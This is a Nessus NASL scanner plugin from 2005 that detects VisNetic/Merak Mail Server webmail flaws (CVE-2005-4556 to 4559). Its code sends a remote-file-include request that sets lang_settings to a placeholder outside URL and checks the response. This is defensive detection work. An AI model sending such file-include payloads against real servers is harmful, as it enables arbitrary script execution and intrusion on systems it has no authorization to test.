#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Tan Chew Keong, Secunia Research
#
# This script is released under the GNU GPLv2
#

if(description)
{
 script_id(20346);
 script_version ("$Revision: 1.3 $");

 script_cve_id("CVE-2005-4556", "CVE-2005-4557", "CVE-2005-4558", "CVE-2005-4559");
 script_bugtraq_id(16069);
  
 name["english"] = "VisNetic / Merak Mail Server multiple flaws";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote webmail server is affected by multiple vulnerabilities 
which may allow an attacker to execute arbitrary commands on the remote
host.

Description:

The remote host is running VisNetic / Merak Mail Server, a
multi-featured mail server for Windows. 

The webmail and webadmin services included in the remote version of
this software are prone to multiple flaws.  An attacker could send
specially-crafted URLs to execute arbitrary scripts, perhaps taken
from third-party hosts, or to disclose the content of files on the
remote system. 

See also :

http://secunia.com/secunia_research/2005-62/advisory/
http://www.deerfield.com/download/visnetic-mailserver/

Solution :

Upgrade to Merak Mail Server 8.3.5.r / VisNetic Mail Server version
8.3.5 or later. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for VisNetic Mail Server arbitrary script include";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
  
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports(32000, "Services/www");
 exit(0);
}

#
# da code
#

include("http_func.inc");
include("http_keepalive.inc");

if ( !get_kb_item("Settings/disable_cgi_scanning") )
 port = get_http_port(default:32000);
else
 port = 32000;

if(!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

# nb: software is accessible through either "/mail" (default) or "/".
dirs = make_list("/mail", "");
foreach dir (dirs) {
  req = http_get(item:string(dir, "/accounts/inc/include.php?language=0&lang_settings[0][1]=http://xxxxxxxxxxxxxxx/nessus/"), port:port);
  r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if("http://xxxxxxxxxxxxxxx/nessus/alang.html" >< r)
  {
   security_hole(port);
   exit(0);
  }
}
